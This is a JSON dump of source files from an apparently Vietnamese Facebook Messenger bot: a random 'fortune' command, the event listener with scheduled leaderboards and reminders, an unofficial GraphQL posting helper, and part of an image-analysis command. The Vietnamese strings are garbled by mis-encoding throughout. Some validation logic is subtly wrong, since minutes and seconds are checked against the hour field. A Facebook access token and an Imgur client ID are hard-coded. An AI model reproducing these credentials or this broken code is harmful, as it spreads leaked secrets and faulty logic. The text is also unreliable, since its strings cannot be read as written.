ƒê√£ x·∫£y ra l·ªói khi thay ƒë·ªïi tr·∫°ng th√°i.\", threadID, messageID);\n  }\n};\n","path":null,"size_bytes":4332,"size_tokens":null},"modules/commands/tientri.js":{"content":"module.exports.config = {\n    name: \"tientri\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"binee\",\n    description: \"Ti√™n tri v·ªÅ b·∫°n\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"\",\n    cooldowns: 3,\n    dependencies: {\n        \"request\": \"\",\n        \"fs\": \"\"\n    }\n    \n};\n\nmodule.exports.run = async({ api, event, args, Users }) => {\n\n    const fs = global.nodemodule[\"fs-extra\"];\n    const request = global.nodemodule[\"request\"];\n    const nn = [\"K·∫ø to√°n\",\"Ca sƒ©\",\"Th·ª£ s·ª≠a ·ªï kh√≥a\",\"B√°n ve chai\",\"ƒê√†o m·ªè\",\"B√°c sƒ©\",\"B√°c sƒ© th√∫ √Ω\",\"di·ªÖn vi√™n\",\"Ngh·ªá sƒ©\",\"C√¥ng nh√¢n\",\"L√†m ƒëƒ©\",\"B√°n v√© s·ªë\",\"Ti·∫øp vi√™n h√†ng kh√¥ng\",\"Qu·∫£n l√≠ ng√¢n h√†ng\",\"Ch·ªß c·ª≠a h√†ng th√∫ c∆∞ng\",\"ƒÇn h√†ng ·ªü kh√¥ng\",\"V√¥ gia c∆∞\",\"Th·∫•t nghi·ªáp\",\"B√°n ch√®\",\"Kinh doanh ma t√∫y\",\"Ch·∫ø t·∫°o m√°y t√≠nh\",\"Hacker\",\"Tricker\",\"ƒÇn b√°m gia ƒë√¨nh\",\"Ph·ª• h·ªì\",\"Staker chuy√™n nghi·ªáp\",\"C√¥ng t√°c vi√™n Facebook\",\"B√°n h√†ng sida\",\"B√°n h√†ng online\",\"Th·ª£ may\",\"L√†m m√≥ng/nail\",\"Th·ª£ ƒëi·ªán\",\"Thu ti·ªÅn n∆∞·ªõc\",\"D·ªçn v·ªá sing\",\"Lao c√¥ng\",\"B·∫£o v·ªá ·ªü B√°ch H√≥a Xanh\",\"B·∫£o v·ªá ·ªü ƒêi·ªán m√°y xanh\",\"Streamer\",\"C·∫ßu th·ªß b√≥ng ƒë√°\",\"H·ªça sƒ©\",\"Th·∫°c sƒ©\",\"T·ªïng th·ªëng\",\"Ch·ªß t·ªãch x√£\",\"Ch·ªß t·ªãch huy·ªán\",\"Ch·ªß t·ªãch t·ªânh\",\"Ch·ªß t·ªãch n∆∞·ªõc\",\"C·∫≠n v·ªá c·ªßa t·ªïng th·ªëng\",\"Osin\",\"Nh√¢n vi√™n b√°n h√†ng\",\"Giang h·ªì\",\"Giang H·ªì m√µm\",\"Tiktoker\",\"Youtuber\",\"Giao d·ªãch\",\"Qu·∫£n tr·ªã kh√°ch s·∫°n\",\"L·∫Øp ƒë·∫∑t camera\",\"Giao h√†ng online\",\"B√°n xe ƒë·∫°p\",\"B√°n xe m√°y\",\"B√°n xe m√°y\",\"B√°n xe oto\",\"B√°n nh√†\",\"B√°n ƒë·∫•t\",\"N√¥ng d√¢n\",\"l√†m ru·ªông\",\"l·ªìng ti·∫øn phim ho·∫°t h√¨nh\",\"l·ªìng ti·∫øn phim sex\",\"ƒê√≥ng phim sex\",\"Ng∆∞·ªùi h·∫ßu\",\"K·∫ø ng√¥i Th·∫ßy √¥ng n·ªôi\",\"Lau k√≠nh\",\"Ch√† b·ªìn c·∫ßu\",\"Nh√† ti√™n tri\",\"Ch·∫ø t·∫°o m√°y m√≥c\",\"X∆∞·ªüng g·ªó\",\"H·∫£i t·∫∑c\",\"Mh√† ph√©p thu·∫≠t\",\"T√†i x·∫ø\",\"Xe √¥m\",\"B√°n b√°nh m√¨\",\"Th·ª£ c√¢u c√°\",];\n    var tile = Math.floor(Math.random() * 101);\n    var tm = Math.floor(Math.random() * 101);\n    var sm = Math.floor(Math.random() * 101);\n    var st = Math.floor(Math.random() * 101);\n    var sl = Math.floor(Math.random() * 101);\n    var giau = Math.floor(Math.random() * 101);\n    var chet = Math.floor(Math.random() * 150);\n    \nif (!args[0]) {\n    var id = event.senderID;\n    var name = (await Users.getData(id)).name\n    var callback = () => api.sendMessage({body:`üíà‚îÄ‚îÄ‚îÄ‚îÄ ‚Ä¢üçÑ‚Ä¢ ‚îÄ‚îÄ‚îÄ‚îÄüíà\\nüíõ${name}üíõ\\nüß† ùêìùê°ùê®ÃÇùêßùê† ùêåùê¢ùêßùê°: „Äê${tm}%„Äë\\nüéÄ ùêçùê†ùê°ùêûÃÇÃÄ ùêßùê†ùê°ùê¢ùêûÃ£ÃÇùê©: ${nn[Math.floor(Math.random() * nn.length)]}\\nüí™ ùêíùêÆÃõÃÅùêú ùêåùêöÃ£ùêßùê°: „Äê${sm}%„Äë\\nüßõ‚Äç‚ôÇÔ∏è ùêíùê¢ùêßùê° ùêìùê®ÃÇÃÄùêß: „Äê${st}%„Äë\\nüßü‚Äç‚ôÄÔ∏è ùêìùê´ùê¢ÃÄùêßùê° ùêóùêöÃ£ùê® ùêãùê®ÃÇÃÄùêß: „Äê${sl}%„Äë\\nüí∏ ùêíùêÆÃõÃ£ ùêÜùê¢ùêöÃÄùêÆ ùêÇùê®ÃÅ: „Äê${giau}%„Äë\\n‚è≥ ùêìùêÆùê®ÃÇÃâùê¢ ùêìùê°ùê®Ã£: „Äê${chet}„Äë\\nüíà‚îÄ‚îÄ‚îÄ‚îÄ ‚Ä¢üçÑ‚Ä¢ ‚îÄ‚îÄ‚îÄ‚îÄüíà`,attachment: fs.createReadStream(__dirname + \"/cache/1.png\")}, event.threadID, () => fs.unlinkSync(__dirname + \"/cache/1.png\"),event.messageID); \n       return request(encodeURI(`https://graph.facebook.com/${id}/picture?height=750&width=750&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`)).pipe(fs.createWriteStream(__dirname+'/cache/1.png')).on('close',() => callback());\n   }\n\nelse if (Object.keys(event.mentions).length == 1) {\n    var mentions = Object.keys(event.mentions)\n    var name = (await Users.getData(mentions)).name\n    var callback = () => api.sendMessage({body:`üíà‚îÄ‚îÄ‚îÄ‚îÄ ‚Ä¢üçÑ‚Ä¢ ‚îÄ‚îÄ‚îÄ‚îÄüíà\\nüíõ${name}üíõ\\nüß† ùêìùê°ùê®ÃÇùêßùê† ùêåùê¢ùêßùê°: „Äê${tm}%„Äë\\nüéÄ ùêçùê†ùê°ùêûÃÇÃÄ ùêßùê†ùê°ùê¢ùêûÃ£ÃÇùê©: ${nn[Math.floor(Math.random() * nn.length)]}\\nüí™ ùêíùêÆÃõÃÅùêú ùêåùêöÃ£ùêßùê°: „Äê${sm}%„Äë\\nüßõ‚Äç‚ôÇÔ∏è ùêíùê¢ùêßùê° ùêìùê®ÃÇÃÄùêß: „Äê${st}%„Äë\\nüßü‚Äç‚ôÄÔ∏è ùêìùê´ùê¢ÃÄùêßùê° ùêóùêöÃ£ùê® ùêãùê®ÃÇÃÄùêß: „Äê${sl}%„Äë\\nüí∏ ùêíùêÆÃõÃ£ ùêÜùê¢ùêöÃÄùêÆ ùêÇùê®ÃÅ: „Äê${giau}%„Äë\\n‚è≥ ùêìùêÆùê®ÃÇÃâùê¢ ùêìùê°ùê®Ã£: „Äê${chet}„Äë\\nüíà‚îÄ‚îÄ‚îÄ‚îÄ ‚Ä¢üçÑ‚Ä¢ ‚îÄ‚îÄ‚îÄ‚îÄüíà`,attachment: fs.createReadStream(__dirname + \"/cache/1.png\")}, event.threadID, () => fs.unlinkSync(__dirname + \"/cache/1.png\"),event.messageID);   \n       return request(encodeURI(`https://graph.facebook.com/${mentions}/picture?height=750&width=750&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`)).pipe(fs.createWriteStream(__dirname+'/cache/1.png')).on('close',() => callback());\n    }\n\nelse {\n  if(!args[1]){\n  if (event.type == \"message_reply\") idmen = event.messageReply.senderID\n    else idmen = event.senderID;\n    var name = (await Users.getData(idmen)).name\n    var callback = () => api.sendMessage({body:`üíà‚îÄ‚îÄ‚îÄ‚îÄ ‚Ä¢üçÑ‚Ä¢ ‚îÄ‚îÄ‚îÄ‚îÄüíà\\nüíõ${name}üíõ\\nüß† ùêìùê°ùê®ÃÇùêßùê† ùêåùê¢ùêßùê°: „Äê${tm}%„Äë\\nüéÄ ùêçùê†ùê°ùêûÃÇÃÄ ùêßùê†ùê°ùê¢ùêûÃ£ÃÇùê©: ${nn[Math.floor(Math.random() * nn.length)]}\\nüí™ ùêíùêÆÃõÃÅùêú ùêåùêöÃ£ùêßùê°: „Äê${sm}%„Äë\\nüßõ‚Äç‚ôÇÔ∏è ùêíùê¢ùêßùê° ùêìùê®ÃÇÃÄùêß: „Äê${st}%„Äë\\nüßü‚Äç‚ôÄÔ∏è ùêìùê´ùê¢ÃÄùêßùê° ùêóùêöÃ£ùê® ùêãùê®ÃÇÃÄùêß: „Äê${sl}%„Äë\\nüí∏ ùêíùêÆÃõÃ£ ùêÜùê¢ùêöÃÄùêÆ ùêÇùê®ÃÅ: „Äê${giau}%„Äë\\n‚è≥ ùêìùêÆùê®ÃÇÃâùê¢ ùêìùê°ùê®Ã£: „Äê${chet}„Äë\\nüíà‚îÄ‚îÄ‚îÄ‚îÄ ‚Ä¢üçÑ‚Ä¢ ‚îÄ‚îÄ‚îÄ‚îÄüíà`,attachment: fs.createReadStream(__dirname + \"/cache/1.png\")}, event.threadID, () => fs.unlinkSync(__dirname + \"/cache/1.png\"),event.messageID); \n       return request(encodeURI(`https://graph.facebook.com/${idmen}/picture?height=750&width=750&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`)).pipe(fs.createWriteStream(__dirname+'/cache/1.png')).on('close',() => callback());\n   \n    }\n  }\n}\n","path":null,"size_bytes":5820,"size_tokens":null},"includes/listen.js":{"content":"module.exports = function ({ api, models }) {\n  setInterval(function () {\n    if(global.config.NOTIFICATION) {\n      require(\"./handle/handleNotification.js\")({ api });\n    }\n  }, 1000*60);\n    const fs = require(\"fs\");\n    const Users = require(\"./controllers/users\")({ models, api }),\n        Threads = require(\"./controllers/threads\")({ models, api }),\n        Currencies = require(\"./controllers/currencies\")({ models });\n    const logger = require(\"../utils/log.js\");\n    const moment = require('moment-timezone');\n    const axios = require(\"axios\");\n    var day = moment.tz(\"Asia/Ho_Chi_Minh\").day();\n\n\n    const checkttDataPath = __dirname + '/../modules/commands/tuongtac/checktt/';\n    setInterval(async () => {\n        const day_now = moment.tz(\"Asia/Ho_Chi_Minh\").day();\n        const _ADMINIDs = [...global.config.NDH, ...global.config.ADMINBOT];\n      try {\n        if (day != day_now) {\n            day = day_now;\n            const checkttData = fs.readdirSync(checkttDataPath).filter(file => {\n              const _ID = file.replace('.json', '');\n              return _ADMINIDs.includes(_ID) || global.data.allThreadID.includes(_ID);\n            });\n            console.log('B·∫Øt ƒë·∫ßu ki·ªÉm tra t∆∞∆°ng t√°c ng√†y m·ªõi');\n            await new Promise(async resolve => {\n                for (const checkttFile of checkttData) {\n                    const checktt = JSON.parse(fs.readFileSync(checkttDataPath + checkttFile));\n                    let storage = [], count = 1;\n                    for (const item of checktt.day) {\n                        const userName = await Users.getNameUser(item.id) || 'T√™n kh√¥ng t·ªìn t·∫°i';\n                        const itemToPush = item;\n                        itemToPush.name = userName;\n                        storage.push(itemToPush);\n                    };\n                    storage.sort((a, b) => {\n                        if (a.count > b.count) {\n                            return -1;\n                        }\n                        else if (a.count < b.count) {\n                            return 1;\n                        } else {\n                            return a.name.localeCompare(b.name);\n                        }\n                    });\n                    let checkttBody = '¬ªùóßùó¢ùó£ ùóßùó®Ãõùó¢Ãõùó°ùóö ùóßùóîÃÅùóñ ùó°ùóöùóîÃÄùó¨¬´\\n\\n';\n                    checkttBody += storage.slice(0, 10).map(item => {\n                        return `${count++}. ${item.name} (${item.count})`;\n                    }).join('\\n');\n                    api.sendMessage(checkttBody, checkttFile.replace('.json', ''), (err) => err ? console.log(err) : '');\n\n                    checktt.day.forEach(e => {\n                        e.count = 0;\n                    });\n                    checktt.time = day_now;\n                    fs.writeFileSync(checkttDataPath + checkttFile, JSON.stringify(checktt, null, 4));\n                }\n                resolve();\n            })\n\n            await new Promise(async resolve => {\n                if (day_now == 1) {\n                    console.log('B·∫Øt ƒë·∫ßu ki·ªÉm tra t∆∞∆°ng t√°c tu·∫ßn m·ªõi');\n                    for (const checkttFile of checkttData) {\n                        const checktt = JSON.parse(fs.readFileSync(checkttDataPath + checkttFile));\n                        let storage = [], count = 1;\n                        for (const item of checktt.week) {\n                            const userName = await Users.getNameUser(item.id) || 'T√™n kh√¥ng t·ªìn t·∫°i';\n                            const itemToPush = item;\n                            itemToPush.name = userName;\n                            storage.push(itemToPush);\n                        };\n                        storage.sort((a, b) => {\n                            if (a.count > b.count) {\n                                return -1;\n                            }\n                            else if (a.count < b.count) {\n                                return 1;\n                            } else {\n                                return a.name.localeCompare(b.name);\n                            }\n                        });\n                        let checkttBody = '¬ªùóßùó¢ùó£ ùóßùó®Ãõùó¢Ãõùó°ùóö ùóßùóîÃÅùóñ ùóßùó®ùóîÃÇÃÄùó°¬´\\n\\n';\n                        checkttBody += storage.slice(0, 10).map(item => {\n                            return `${count++}. ${item.name} (${item.count})`;\n                        }).join('\\n');\n                        api.sendMessage(checkttBody, checkttFile.replace('.json', ''), (err) => err ? console.log(err) : '');\n                        checktt.week.forEach(e => {\n                            e.count = 0;\n                        });\n                        fs.writeFileSync(checkttDataPath + checkttFile, JSON.stringify(checktt, null, 4));\n                    }\n                }\n                resolve();\n            })\n\n            global.client.sending_top = false;\n        }\n      } catch(e) { console.error(e) }\n    }, 1000 * 10);\n    //////////////////////////////////////////////////////////////////////\n    //========= Push all variable from database to environment =========//\n    //////////////////////////////////////////////////////////////////////\n\n    (async function () {\n\n        try {\n            logger(global.getText('listen', 'startLoadEnvironment'), '[ D·ªØ li·ªáu ]');\n            let threads = await Threads.getAll(),\n                users = await Users.getAll(['userID', 'name', 'data']),\n                currencies = await Currencies.getAll(['userID']);\n            for (const data of threads) {\n                const idThread = String(data.threadID);\n                global.data.allThreadID.push(idThread),\n                    global.data.threadData.set(idThread, data['data'] || {}),\n                    global.data.threadInfo.set(idThread, data.threadInfo || {});\n                if (data['data'] && data['data']['banned'] == !![])\n                    global.data.threadBanned.set(idThread,\n                        {\n                            'reason': data['data']['reason'] || '',\n                            'dateAdded': data['data']['dateAdded'] || ''\n                        });\n                if (data['data'] && data['data']['commandBanned'] && data['data']['commandBanned']['length'] != 0)\n                    global['data']['commandBanned']['set'](idThread, data['data']['commandBanned']);\n                if (data['data'] && data['data']['NSFW']) global['data']['threadAllowNSFW']['push'](idThread);\n            }\n            logger.loader(global.getText('listen', 'loadedEnvironmentThread'));\n            for (const dataU of users) {\n                const idUsers = String(dataU['userID']);\n                global.data['allUserID']['push'](idUsers);\n                if (dataU.name && dataU.name['length'] != 0) global.data.userName['set'](idUsers, dataU.name);\n                if (dataU.data && dataU.data.banned == 1) global.data['userBanned']['set'](idUsers, {\n                    'reason': dataU['data']['reason'] || '',\n                    'dateAdded': dataU['data']['dateAdded'] || ''\n                });\n                if (dataU['data'] && dataU.data['commandBanned'] && dataU['data']['commandBanned']['length'] != 0)\n                    global['data']['commandBanned']['set'](idUsers, dataU['data']['commandBanned']);\n            }\n            for (const dataC of currencies) global.data.allCurrenciesID.push(String(dataC['userID']));\n            logger.loader(global.getText('listen', 'loadedEnvironmentUser')), logger(global.getText('listen', 'successLoadEnvironment'), '[ D·ªØ li·ªáu ]');\n        } catch (error) {\n            return logger.loader(global.getText('listen', 'failLoadEnvironment', error), 'error');\n        }\n    }());\n    logger(`[ ${global.config.PREFIX} ] ‚Ä¢ ${(!global.config.BOTNAME) ? \"ùôçùòºùôâ ùòΩùôäùôè\" : global.config.BOTNAME}`, \"[ Th√¥ng tin Bot ]\");\n\n    ///////////////////////////////////////////////\n    //========= Require all handle need =========//\n    //////////////////////////////////////////////\n\n    const handleCommand = require(\"./handle/handleCommand\")({ api, models, Users, Threads, Currencies });\n    const handleCommandEvent = require(\"./handle/handleCommandEvent\")({ api, models, Users, Threads, Currencies });\n    const handleReply = require(\"./handle/handleReply\")({ api, models, Users, Threads, Currencies });\n    const handleReaction = require(\"./handle/handleReaction\")({ api, models, Users, Threads, Currencies });\n  const handleRefresh = require(\"./handle/handleRefresh\")({  api, Threads, Users, Currencies, models });\n    const handleEvent = require(\"./handle/handleEvent\")({ api, models, Users, Threads, Currencies });\n    const handleCreateDatabase = require(\"./handle/handleCreateDatabase\")({ api, Threads, Users, Currencies, models });\n\n    //DEFINE DATLICH PATH\n    const datlichPath = __dirname + \"/../modules/commands/cache/data/datlich.json\";\n\n    //FUNCTION HO·∫†T ƒê·ªòNG NH∆Ø C√ÅI T√äN C·ª¶A N√ì, CRE: DUNGUWU\n    const monthToMSObj = {\n        1: 31 * 24 * 60 * 60 * 1000,\n        2: 28 * 24 * 60 * 60 * 1000,\n        3: 31 * 24 * 60 * 60 * 1000,\n        4: 30 * 24 * 60 * 60 * 1000,\n        5: 31 * 24 * 60 * 60 * 1000,\n        6: 30 * 24 * 60 * 60 * 1000,\n        7: 31 * 24 * 60 * 60 * 1000,\n        8: 31 * 24 * 60 * 60 * 1000,\n        9: 30 * 24 * 60 * 60 * 1000,\n        10: 31 * 24 * 60 * 60 * 1000,\n        11: 30 * 24 * 60 * 60 * 1000,\n        12: 31 * 24 * 60 * 60 * 1000\n    };\n    const checkTime = (time) => new Promise((resolve) => {\n        time.forEach((e, i) => time[i] = parseInt(String(e).trim()));\n        const getDayFromMonth = (month) => (month == 0) ? 0 : (month == 2) ? (time[2] % 4 == 0) ? 29 : 28 : ([1, 3, 5, 7, 8, 10, 12].includes(month)) ? 31 : 30;\n        if (time[1] > 12 || time[1] < 1) resolve(\"Th√°ng c·ªßa b·∫°n c√≥ v·∫ª kh√¥ng h·ª£p l·ªá\");\n        if (time[0] > getDayFromMonth(time[1]) || time[0] < 1) resolve(\"Ng√†y c·ªßa b·∫°n c√≥ v·∫ª kh√¥ng h·ª£p l·ªá\");\n        if (time[2] < 2022) resolve(\"B·∫°n s·ªëng ·ªü k·ª∑ nguy√™n n√†o th·∫ø\");\n        if (time[3] > 23 || time[3] < 0) resolve(\"Gi·ªù c·ªßa b·∫°n c√≥ v·∫ª kh√¥ng h·ª£p l·ªá\");\n        if (time[4] > 59 || time[3] < 0) resolve(\"Ph√∫t c·ªßa b·∫°n c√≥ v·∫ª kh√¥ng h·ª£p l·ªá\");\n        if (time[5] > 59 || time[3] < 0) resolve(\"Gi√¢y c·ªßa b·∫°n c√≥ v·∫ª kh√¥ng h·ª£p l·ªá\");\n        yr = time[2] - 1970;\n        yearToMS = (yr) * 365 * 24 * 60 * 60 * 1000;\n        yearToMS += ((yr - 2) / 4).toFixed(0) * 24 * 60 * 60 * 1000;\n        monthToMS = 0;\n        for (let i = 1; i < time[1]; i++) monthToMS += monthToMSObj[i];\n        if (time[2] % 4 == 0) monthToMS += 24 * 60 * 60 * 1000;\n        dayToMS = time[0] * 24 * 60 * 60 * 1000;\n        hourToMS = time[3] * 60 * 60 * 1000;\n        minuteToMS = time[4] * 60 * 1000;\n        secondToMS = time[5] * 1000;\n        oneDayToMS = 24 * 60 * 60 * 1000;\n        timeMs = yearToMS + monthToMS + dayToMS + hourToMS + minuteToMS + secondToMS - oneDayToMS;\n        resolve(timeMs);\n    });\n\n\n    const tenMinutes = 10 * 60 * 1000;\n\n    const checkAndExecuteEvent = async () => {\n\n        /*smol check*/\n        if (!fs.existsSync(datlichPath)) fs.writeFileSync(datlichPath, JSON.stringify({}, null, 4));\n        var data = JSON.parse(fs.readFileSync(datlichPath));\n\n        //GET CURRENT TIME\n        var timeVN = moment().tz('Asia/Ho_Chi_Minh').format('DD/MM/YYYY_HH:mm:ss');\n        timeVN = timeVN.split(\"_\");\n        timeVN = [...timeVN[0].split(\"/\"), ...timeVN[1].split(\":\")];\n\n        let temp = [];\n        let vnMS = await checkTime(timeVN);\n        const compareTime = e => new Promise(async (resolve) => {\n            let getTimeMS = await checkTime(e.split(\"_\"));\n            if (getTimeMS < vnMS) {\n                if (vnMS - getTimeMS < tenMinutes) {\n                    data[boxID][e][\"TID\"] = boxID;\n                    temp.push(data[boxID][e]); delete data[boxID][e];\n                } else delete data[boxID][e];\n                fs.writeFileSync(datlichPath, JSON.stringify(data, null, 4));\n            };\n            resolve();\n        })\n\n        await new Promise(async (resolve) => {\n            for (boxID in data) {\n                for (e of Object.keys(data[boxID])) await compareTime(e);\n            }\n            resolve();\n        })\n        for (el of temp) {\n            try {\n                var all = (await Threads.getInfo(el[\"TID\"])).participantIDs;\n                all.splice(all.indexOf(api.getCurrentUserID()), 1);\n                var body = el.REASON || \"ü•∞ü•∞ü•∞\", mentions = [], index = 0;\n\n                for (let i = 0; i < all.length; i++) {\n                    if (i == body.length) body += \" ‚Äç \";\n                    mentions.push({\n                        tag: body[i],\n                        id: all[i],\n                        fromIndex: i - 1\n                    });\n                }\n            } catch (e) { return console.log(e); }\n            var out = {\n                body, mentions\n            }\n            if (\"ATTACHMENT\" in el) {\n                out.attachment = [];\n                for (a of el.ATTACHMENT) {\n                    let getAttachment = (await axios.get(encodeURI(a.url), { responseType: \"arraybuffer\" })).data;\n                    fs.writeFileSync(__dirname + `/../modules/commands/cache/${a.fileName}`, Buffer.from(getAttachment, 'utf-8'));\n                    out.attachment.push(fs.createReadStream(__dirname + `/../modules/commands/cache/${a.fileName}`));\n                }\n            }\n            console.log(out);\n            if (\"BOX\" in el) await api.setTitle(el[\"BOX\"], el[\"TID\"]);\n            api.sendMessage(out, el[\"TID\"], () => (\"ATTACHMENT\" in el) ? el.ATTACHMENT.forEach(a => fs.unlinkSync(__dirname + `/../modules/commands/cache/${a.fileName}`)) : \"\");\n        }\n\n    }\n    setInterval(checkAndExecuteEvent, tenMinutes / 10);\n    //////////////////////////////////////////////////\n    //========= Send event to handle need =========//\n    /////////////////////////////////////////////////\n\n    return async (event) => {\n\n        if (event.type == \"change_thread_image\") api.sendMessage(`¬ª [ ùêÇùêÄÃ£ÃÇùêè ùêçùêáùêÄÃ£ÃÇùêì ùêçùêáùêéÃÅùêå ]\\n¬ª  ${event.snippet}`, event.threadID);\n        switch (event.type) {\n            case \"message\":\n            case \"message_reply\":\n            case \"message_unsend\":\n                handleCreateDatabase({ event });\n                handleCommand({ event });\n                handleReply({ event });\n                handleCommandEvent({ event });\n\n                break;\n            case \"change_thread_image\":\n            case \"event\":\n                handleEvent({ event });\n                handleRefresh({ event });\n                if (event.type != \"change_thread_image\" && global.config.notiGroup) {\n          var msg = '¬ª [ ùêÇùêÄÃ£ÃÇùêè ùêçùêáùêÄÃ£ÃÇùêì ùêçùêáùêéÃÅùêå ]\\n¬ª '\n          msg += event.logMessageBody\n          if(event.author == api.getCurrentUserID()) {\n            msg = msg.replace('B·∫°n ', global.config.BOTNAME)\n          }\n          api.sendMessage(msg, event.threadID);\n        }\n                break;\n            case \"message_reaction\":\n              var { iconUnsend } = global.config\n              if(iconUnsend.status && event.senderID == api.getCurrentUserID() && event.reaction == iconUnsend.icon) {\n                api.unsendMessage(event.messageID)\n              }\n              handleReaction({ event });\n              break;\n            default:\n              break;\n        }\n    };\n};","path":null,"size_bytes":15537,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/Dev_shareTest3.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\treturn async function shareTest(text, senderID, threadID, callback) {\n\t\tvar resolveFunc = function () { };\n\t\tvar rejectFunc = function () { };\n\t\tvar returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\t\tif (!callback) {\n\t\t\tcallback = function (err, data) {\n\t\t\t\tif (err) return rejectFunc(err);\n\t\t\t\tresolveFunc(data);\n\t\t\t};\n\t\t}\n        console.log('11111111111')\n\t\t\n\n\t\tconst form = {\n\t\t\timage_file: global.Fca.Require.fs.readFileSync(__dirname + \"/abc.jpg\", 'base64')\t\t\t,\n\t\t\tav: 100077059530660,\n\t\t\tfb_api_req_friendly_name: \"CustomUpdateMutationModern_MarkAfterShareShownMutation\",\n\t\t\tlsd: \"0\",\n\n\t\t\tvariables:JSON.stringify({\n\t\t\t\tinput: {\n\t\t\t\t  \"context_token_id\": \"0\",\n\t\t\t\t  \"cta\": \"Play Now\",\n\t\t\t\t  \"data\":JSON.stringify({\n\t\t\t\t\t\"inviteTime\": 1713075355422,\n\t\t\t\t\t\"inviteId\": 2566710246101,\n\t\t\t\t\t\"contextId\": \"0\",\n\t\t\t\t\t\"inviteActivityId\": 220097,\n\t\t\t\t\t\"type\": \"invite_friend_friendlist\",\n\t\t\t\t\t\"token\": \"\"\n\t\t\t\t  }),\n\t\t\t\t  \"extra\": JSON.stringify({\n\t\t\t\t\t\"template\": \"join_fight\",\n\t\t\t\t\t\"notification\": \"PUSH\"\n\t\t\t\t  }),\n\t\t\t\t  \"game_id\": \"0\",\n\t\t\t\t  \"image_file_content_type\": \"application/base64\",\n\t\t\t\t  \"play_style\": \"BASIC\",\n\t\t\t\t  \"session_id\": utils.getGUID(),\n\t\t\t\t  \"text\": \"0\",\n\t\t\t\t  \"actor_id\": \"100077059530660\",\n\t\t\t\t  \"client_mutation_id\":Math.round(Math.random()*19).toString()\n\t\t\t\t}\n\t\t\t  }),\n\t\t\tfb_api_caller_class: \"RelayModern\",\n\t\t\tserver_timestamps: true,\ndoc_id: 0\n\t\t}\n\t\tdefaultFuncs\n\t\t.post(\"https://www.facebook.com/api/graphql\", ctx.jar, form)\n\t\t.then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n\t\t.then(function(resData) {\n\t\t\tconsole.log(resData)\n\t\t\tif (resData.error) throw resData;\n\t\t\telse return callback(null,true)\n\t\t})\n\t\t.catch(function(err) {\n\t\treturn callback(err);\n\t});\n\t\treturn returnPromise;\n\t};\n};\n","path":null,"size_bytes":1916,"size_tokens":null},"modules/commands/echo.js":{"content":"module.exports.config = {\n  name: \"echo\",\n  version: \"1.0.0\", \n  hasPermssion: 3,\n  credits: \"DungUwU\",\n  description: \"g·ª≠i tin nh·∫Øn\", \n  commandCategory: \"H·ªá Th·ªëng\", \n  usages: \"\", \n  cooldowns: 5\n};\n\nmodule.exports.run = async function({ api, event, args }) {\n    return api.sendMessage(args.join(\" \"), event.threadID);\n}","path":null,"size_bytes":331,"size_tokens":null},"modules/commands/geminiv1.js":{"content":"const imgur = require(\"imgur\");\nconst fs = require(\"fs\");\nconst axios = require(\"axios\");\nconst { downloadFile } = require(\"../../utils/index\");\nconst { join } = require(\"path\");\n\nmodule.exports.config = {\n  name: \"geminiv1\",\n  version: \"1.2.0\",\n  hasPermssion: 0,\n  credits: \"TatsuYTB\",\n  description: \"Ph√¢n t√≠ch h√¨nh ·∫£nh b·∫±ng AI\",\n  commandCategory: \"AI\",\n  usages: \"geminiv1 [reply]\",\n  cooldowns: 10\n};\n\nconst getApiUrl = () => {\n  try {\n    const filePath = join(__dirname, 'data', 'api.json');\n    const data = fs.readFileSync(filePath, 'utf-8');\n    const jsonData = JSON.parse(data);\n\n    if (!jsonData.geminiv1 || jsonData.geminiv1.trim() === '') {\n      console.error(\"API URL kh√¥ng c√≥ trong file api.json.\");\n      return null;\n    }\n\n    return jsonData.geminiv1;\n  } catch (error) {\n    console.error('L·ªói khi ƒë·ªçc API URL:', error);\n    return null;\n  }\n};\n\nconst translateToVietnamese = async (text) => {\n  const lang = \"vi\";\n  const translateThis = encodeURIComponent(text);\n\n  try {\n    const response = await axios.get(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${lang}&dt=t&q=${translateThis}`);\n    \n    if (response.data && Array.isArray(response.data[0])) {\n      return response.data[0][0][0];\n    } else {\n      throw new Error(\"Ph·∫£n h·ªìi d·ªãch kh√¥ng h·ª£p l·ªá.\");\n    }\n  } catch (error) {\n    throw new Error(\"L·ªói khi d·ªãch vƒÉn b·∫£n: \" + error.message);\n  }\n};\n\nmodule.exports.run = async ({ api, event }) => {\n  const { threadID, type, messageReply, messageID } = event;\n  const ClientID = \"f20bdcf02b2f89e\";\n  if (type !== \"message_reply\" || messageReply.attachments.length == 0) \n    return api.sendMessage(\"B·∫°n ph·∫£i reply m·ªôt ·∫£nh n√†o ƒë√≥\", threadID, messageID);\n\n  imgur.setClientId(ClientID);\n  const attachmentSend = [];\n\n  // L·∫•y c√°c file ƒë√≠nh k√®m\n  async function getAttachments(attachments) {\n    let startFile = 0;\n    for (const data of attachments) {\n      const ext = data.type == \"photo\" ? \"jpg\" : \"txt\";\n      const pathSave = __dirname + `/cache/${startFile}.${ext}`;\n      ++startFile;\n      const url = data.url;\n      await downloadFile(url, pathSave);\n      attachmentSend.push(pathSave);\n    }\n  }\n\n  await getAttachments(messageReply.attachments);\n  let Success = 0, Error = [];\n\n  const getChatResponse = async (imageUrl) => {\n    try {\n      const apiUrl = getApiUrl();\n      if (!apiUrl) {\n        throw new Error(\"Kh√¥ng th·ªÉ l·∫•y URL API, vui l√≤ng ki·ªÉm tra file api.json.\");\n      }\n      \n      const response = await axios.get(`${apiUrl}&url=${encodeURIComponent(imageUrl)}`);\n      \n      if (response.data && response.data.gemini) {\n        return response.data.gemini;\n      } else {\n        throw new Error(\"Kh√¥ng t√¨m th·∫•y k·∫øt qu·∫£ ph√¢n t√≠ch t·ª´ API.\");\n      }\n    } catch (error) {\n      console.error('L·ªói khi l·∫•y ph·∫£n h·ªìi t·ª´ AI:', error);\n      throw error;\n    }\n  };\n\n  // X·ª≠ l√Ω ·∫£nh v√† tr·∫£ k·∫øt 